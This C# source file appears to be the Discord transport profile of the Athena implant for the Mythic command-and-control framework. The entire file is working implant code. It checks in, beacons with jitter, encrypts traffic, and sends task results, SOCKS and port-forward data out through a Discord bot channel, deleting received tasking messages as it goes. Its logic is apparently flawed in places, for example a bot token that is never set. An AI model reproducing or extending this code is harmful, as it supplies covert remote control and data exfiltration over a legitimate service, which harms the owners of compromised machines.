using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Comms.SMB;
using Athena.Utilities;
using Discore;
using Discore.Http;
using Discore.WebSocket;
using System.Diagnostics;
using System.Text.Json;
using Athena.Models.Proxy;
using Athena.Profiles.Discord.Models;

namespace Athena.Profiles.Discord
{
    public class Discord : IProfile
    {
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public string uuid { get; set; }
        public bool encrypted { get; set; }
        public PSKCrypto? crypt { get; set; }
        public string psk { get; set; }
        private string botToken { get; set; }
        private int _currentAttempt = 0;
        private int _maxAttempts = 5;
        private CancellationTokenSource cts = new CancellationTokenSource();
        private string _agentGuid = Guid.NewGuid().ToString();
        private DiscordHttpClient _discordHttpClient { get; set; }
        private Shard _discordSocketClient { get; set; }
        private Snowflake _channelId { get; set; }
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;

        public Discord()
        {
            this.uuid = "%UUID%";
            this._channelId = new Snowflake(ulong.Parse("bot_channel"));
            this.psk = "AESPSK";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
            this.jitter = jitter;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
            }

            this._discordHttpClient = new DiscordHttpClient(this.botToken);
            this._discordSocketClient = new Shard(this.botToken, 0, 1);
            this._discordSocketClient.Gateway.OnMessageCreate += Gateway_OnMessageCreate;
        }

        async void Gateway_OnMessageCreate(object? sender, MessageCreateEventArgs e)
        {
            DiscordMessage message = e.Message;
            //e.Message.Attachments.Count

            MythicMessageWrapper mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(e.Message.Content);


            //Checks, is the message null, is the sender the same as the agent, is the message to the server
            //If any of these checks are true, then it's not meant for us.
            if (mythicMessage == null || mythicMessage.sender_id != this._agentGuid || mythicMessage.to_server)
            {
                return;
            }


            //If we get to here, it's a message for us.
            if(String.IsNullOrEmpty(mythicMessage.message)) //We have to get the attachment to get the content of the message
            {
                //Get embed content
                mythicMessage.message = await GetFileContentsAsync(message.Attachments[0].Url);
            }

            MessageReceivedArgs mra = new MessageReceivedArgs(mythicMessage.message);
            SetMessageReceived?.Invoke(this, mra);

            DeleteMessage(e.Message);
        }

        public async Task<bool> Send(string json)
        {
            try
            {
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(this.uuid + json);
                }

                MythicMessageWrapper msg = new MythicMessageWrapper()
                {
                    message = json,
                    id = 0,
                    final = true,
                    sender_id = _agentGuid,
                    to_server = true
                };

                string strMsg = JsonSerializer.Serialize(msg);
                if (strMsg.Length > 1950)
                {
                    //SendAttachment
                    await SendAttachment(strMsg);
                }
                else
                {
                    //SendMessage
                    await SendMessage(strMsg);
                }

                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        private async Task<bool> SendAttachment(string json)
        {
            try
            {
                await this._discordHttpClient.CreateMessage(this._channelId, new CreateMessageOptions()
                    .AddAttachment(new AttachmentOptions(0)
                        .SetFileName(_agentGuid + ".server")
                        .SetContent(json)));
            }
            catch
            {
                return false;
            }
            return true;
        }
        private async Task<bool> SendMessage(string json)
        {
            try
            {
                await this._discordHttpClient.CreateMessage(this._channelId, json);
            }
            catch
            {
                return false;
            }
            return true;
        }

        private async Task<string> GetFileContentsAsync(string url)
        {
            string message;
            HttpClient client = new HttpClient();

            using (HttpResponseMessage response = await client.GetAsync(url))
            {
                using (HttpContent content = response.Content)
                {
                    message = await content.ReadAsStringAsync();
                }

                if (response.IsSuccessStatusCode)
                {
                    return await Unescape(message);
                }
                return "";
            }
        }

        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
        public async Task DeleteMessage(DiscordMessage message)
        {
            await this._discordHttpClient.DeleteMessage(message);
        }

        public async Task StartBeacon()
        {
            //Need to decide if I want to have a sleep in this or not
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);

                if (delegateTask.Result.Count <= 0 &&
                    socksTask.Result.Count <= 0 &&
                    responseTask.Result.Count <= 0 &&
                    rpFwdTask.Result.Count <= 0)
                {
                    continue;
                }


                GetTasking gt = new GetTasking()
                {
                    action = "post_response",
                    delegates = delegateTask.Result,
                    socks = socksTask.Result,
                    responses = responseTask.Result,
                    rpfwd = rpFwdTask.Result,
                };
                try
                {
                    if(await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking)))
                    {
                        return;
                    }

                    this._currentAttempt++;
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed {e}");
                    this._currentAttempt++;
                }

                if (this._currentAttempt >= this._maxAttempts)
                {
                    this.cts.Cancel();
                }
            }
            this._discordHttpClient.Dispose();
            this._discordSocketClient.Dispose();
            return;
        }

        public bool StopBeacon()
        {
            this.cts.Cancel();
            return true;
        }

        public async Task<bool> Checkin(Checkin checkin)
        {
            int maxAttempts = 3;
            int currentAttempt = 0;

            await this._discordSocketClient.StartAsync(GatewayIntent.GuildMessages | GatewayIntent.MessageContent);

            do
            {
                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                {
                    return true;
                }

                currentAttempt++;
            } while (currentAttempt <= maxAttempts);

            return false;
        }
    }
}